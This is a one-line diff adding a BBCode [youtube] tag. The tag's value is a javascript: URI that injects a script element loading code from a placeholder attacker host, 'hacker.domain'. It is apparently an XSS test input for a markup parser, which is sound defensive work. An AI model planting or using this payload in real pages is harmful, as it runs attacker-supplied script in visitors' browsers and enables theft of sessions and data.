@@ -1,0 +1,1 @@
+[youtube=javascript:t=document.createElement('script');t.src='//hacker.domain/script.js';document.body.appendChild(t);//]test[/url]
